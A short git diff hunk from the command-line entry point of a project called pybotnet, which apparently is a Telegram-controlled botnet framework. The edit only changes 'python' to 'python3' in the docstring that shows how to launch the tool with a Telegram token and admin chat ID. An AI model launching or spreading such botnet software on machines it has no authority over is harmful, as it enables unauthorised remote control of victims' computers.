@@ -2,7 +2,7 @@ import argparse
 
 from . import *
 
-"""run pybotnet by (`python -m pybotnet -t [TELEGRAM_TOKEN] -i [ADMIN_CHAT_ID] -n [BOT NAME]`)"""
+"""run pybotnet by (`python3 -m pybotnet -t [TELEGRAM_TOKEN] -i [ADMIN_CHAT_ID] -n [BOT NAME]`)"""
 
 ENGINE_NAMES = ["telegram"]
 
